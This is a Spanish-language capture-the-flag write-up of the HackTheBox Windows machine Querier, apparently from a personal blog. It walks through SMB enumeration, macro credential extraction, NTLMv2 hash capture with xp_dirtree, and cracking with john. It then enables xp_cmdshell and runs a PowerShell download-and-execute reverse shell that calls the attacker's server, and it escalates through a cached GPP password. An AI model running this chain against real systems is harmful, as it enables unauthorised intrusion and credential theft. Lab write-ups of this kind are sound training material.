---
layout: single
title: Querier HTB - WriteUp
excerpt: WriteUp de la máquina Querier de HTB.
date: 2023-02-23
classes: wide
header:
  teaser: /assets/images/Querier/Querier.png
  teaser_home_page: true
  icon: /assets/images/Querier/Querier.png
categories:
  - infosec
tags:
  - ctf
  - Windows                                                                                                                                                                                 
  - Writeup
  - MSSQL                                                                                                                                                                                  
  - NTLMv2                                                                                                                                                                                    
  - xp_cmdshell
  - Cached GPP Files
---


En el día de hoy estaremos resolviendo la máquina Querier de HackTheBox. Es una Máquina Windows.

### Enumeración Inicial.

Lo primero que haremos será escanear los puertos de la máquina es busca de servicios expuestos.

```bash
# Nmap 7.92 scan initiated Thu Feb 23 09:48:52 2023 as: nmap -sC -sV -Pn -oN Extraction -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 10.10.10.125
Nmap scan report for 10.10.10.125
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: QUERIER
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-02-23T08:47:57
|_Not valid after:  2053-02-23T08:47:57
|_ssl-date: 2023-02-23T08:49:57+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-23T08:49:53
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb 23 09:49:57 2023 -- 1 IP address (1 host up) scanned in 65.13 seconds
```

Vemos que tiene varios puertos abiertos, entre ellos podemos encontrar el SMB, el MSSQL y el RPC.

El nombre del dominio lo he extraido con CrackMapExec y lo he metido en el /etc/hosts:

```bash
crackmapexec smb 10.10.10.125                 
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
```



El servicio de RPC no acepta sesiones nulas.

```bash
rpcclient 10.10.10.125 -U '' -N
rpcclient $> enumdomusers 
Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> 
```

Si enumeramos las carpetas compartidas  por SMB podemos ver que hay varias:

```bash
smbclient -L '\\10.10.10.125\' -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      
SMB1 disabled -- no workgroup available
```

Nuestro usuario tienen unicamente acceso a Reports. Dentro de reports hay un archivo de Excel que podemos descargarnos.

```bash
smbclient '\\10.10.10.125\Reports' -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Jan 29 00:23:48 2019
  ..                                  D        0  Tue Jan 29 00:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 23:21:34 2019

                5158399 blocks of size 4096. 827049 blocks available
smb: \> get Currency Volume Report.xlsm
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Currency
smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (23,7 KiloBytes/sec) (average 23,7 KiloBytes/sec)
smb: \> 
```

Si abrimos el archivo nos salta el siguiente mensaje.

![](/assets/images/Querier/image1.png)

Al tener macros lo cerre por si las moscas y me dispuse a analizarlo con olevba.

> Olevba es una herramienta que incorpora python-oletools, en este caso olveba nos va a permitir extraer las macros del archivo .xlsm y ver su contenido


```bash
python3 olevba.py --decode /root/HTB/Querier/content/Currency\ Volume\ Report.xlsm                           
olevba 0.60.2dev1 on Python 3.9.2 - http://decalage.info/python/oletools                                                                                                                   
===============================================================================                                                                                                            
FILE: /root/HTB/Querier/content/Currency Volume Report.xlsm                                                                                                                                
Type: OpenXML                                                                                                                                                                              
WARNING  For now, VBA stomping cannot be detected for files in memory                                                                                                                      
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' macro to pull data for client volume reports 
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"
  
  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
```

Podemos resaltar un usuario y una contraseña:

- reporting:PcwTWTHRwryjc$c6

### Explotación MSSQL.

Si nos intentamos conectar a esa base de datos a traves de mssclient.py vemos que tenemos acceso.

```bash
mssqlclient.py  -p 1433 -db volume 'reporting:PcwTWTHRwryjc$c6@10.10.10.125' -dc-ip 10.10.10.125 -windows-auth 
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> 
```

No tenemos permisos para activar las opciones avanzadas para activar la funcion xp_cmdshell y ejecutar comandos a nivel del sistema.
La base de datos no tiene nada interesante. LLegados a este punto comprobé si las credenciales eran validas a nivel de SMB. No lo eran, asi que probe a ver si puedo extraer el hash NTLMv2 a traves de la función xp_dirtree

```bash
SQL xp_dirtree '\\10.10.16.4\compartido\'
```

Si miramos nuestro servidor de SMB podemos ver que se ha autenticado y vemos el hash NTLMv2

```bash
smbserver.py ./ "compartido" -smb2support                                                                                             [14/14]
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation                                                                                                                                   
                                                                                                                                                                                           
[*] Config file parsed                                                                                                                                                                     
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0                                                                                                                     
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0                                                                                                                     
[*] Config file parsed                                                                                                                                                                     
[*] Config file parsed                                                                                                                                                                     
[*] Config file parsed                                                                                                                                                                     
[*] Incoming connection (10.10.10.125,49675)                                                                                                                                               
[*] AUTHENTICATE_MESSAGE (QUERIER\mssql-svc,QUERIER)                                                                                                                                       
[*] User QUERIER\mssql-svc authenticated successfully                                                                                                                                      
[*] mssql-svc::QUERIER:4141414141414141:1ba7275a7eeffad66f177c7cb4c08be7:010100000000000000ecede06847d901eef23db4414ea4bf000000000100100048007300420047004f006e0051005200030010004800730042
0047004f006e005100520002001000660048004b007800500051005400620004001000660048004b00780050005100540062000700080000ecede06847d90106000400020000000800300030000000000000000000000000300000dddda
93f03c3ca3d8d094646dcbe3b41f914eae0e75cd2f7a92d2c257489c20a0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003400000000000000000000000000
```

El hash pertenece al usuario "mssql-svc". Voy a probar romperlo con la herramienta john.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
corporate568     (mssql-svc)
1g 0:00:00:03 DONE (2023-02-23 10:40) 0.3194g/s 2863Kp/s 2863Kc/s 2863KC/s correg..coreyo05
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

Ya tenemos la contraseña para el usuario mssql-svc

- mssql-svc:corporate568

La contraseña no es valida a nivel de SMB pero si nos sirve para conectarnos a MSSQL.

```bash
mssqlclient.py  -p 1433 'mssql-svc:corporate568@10.10.10.125' -dc-ip 10.10.10.125 -windows-auth
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL>
```

Este usuario si pude activar la función xp_cmdshell.

```SQL
SQL> sp_configure 'show advanced options', '1'
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE
SQL> 
```

```SQL
SQL> sp_configure 'xp_cmdshell', '1'
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE
```

Ahora podemos ejecutar comandos a nivel de sistema:

```SQL
SQL> EXEC xp_cmdshell 'whoami'
output                                                                                                                                                                                                                                                            
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
querier\mssql-svc
```


Vamos a tratar de establecernos una revshell. Para ello tirare del script "Invoke-PowerShellTcp.ps1"

```bash
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.16.4/Invoke-PowerShellTcp.ps1") | powershell -noprofile'
```

Si miramos nuestro servidor de python y nuestro listener veremos que se ha realizado la petición y tenemos nuestra revshell.

Servidor con python:

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.125 - - [23/Feb/2023 10:54:40] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```

Listener de netcat:

```bash
nc -lvnp 443                 
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.125] 49679
Windows PowerShell running as user mssql-svc on QUERIER
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>
```

### Privesc.

Para la escalada de privilegios voy a usar el script PowerUp.ps1 para enumerar la máquina. Lo primero será descargar el script

```Powershell
PS C:\Users\mssql-svc\Desktop> iwr -outf PowerUp.ps1 http://10.10.16.4/PowerUp.ps1
PS C:\Users\mssql-svc\Desktop>
```

Importamos el script:

```powershell
PS C:\Users\mssql-svc\Desktop> Import-Module .\PowerUp.ps1
```

Si lo ejecutamos para que haga todas las comprobaciones nos reporta lo siguiente.

```PowerShell
PS C:\Users\mssql-svc\Desktop> Invoke-AllChecks


Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 3688
ProcessId   : 4904
Name        : 4904
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group 
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files
```

Ha encontrado un archivo Groups.xml que contiene la contraseña del usuario Administrador. El contenido del archivo es el siguiente:

```xml
?xml version="1.0" encoding="UTF-8" ?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
	<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator" image="2" changed="2019-01-28 23:12:48" uid="{CD450F70-CDB8-4948-B908-F8D038C59B6C}" userContext="0" removePolicy="0" policyApplied="1">
		<Properties action="U" newName="" fullName="" description="" cpassword="CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" userName="Administrator"></Properties>
	</User>
</Groups>
```

Como hicimos en una máquina anterior, el cpassword se puede descifrar porque las clave se publico. En este caso PowerUp lo hace automaticamente.

Podemos comprobar si la contraseña es valida a traves de CrackMapExec. Podriamos ganar acceso a traves de evil-winrm

```bash
crackmapexec winrm 10.10.10.125 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!'
WINRM       10.10.10.125    5985   QUERIER          [*] Windows 10.0 Build 17763 (name:QUERIER) (domain:HTB.LOCAL)
WINRM       10.10.10.125    5985   QUERIER          [*] http://10.10.10.125:5985/wsman
WINRM       10.10.10.125    5985   QUERIER          [+] HTB.LOCAL\Administrator:MyUnclesAreMarioAndLuigi!!1! (Pwn3d!)
```

¡Ya hemos pwneado la máquina!


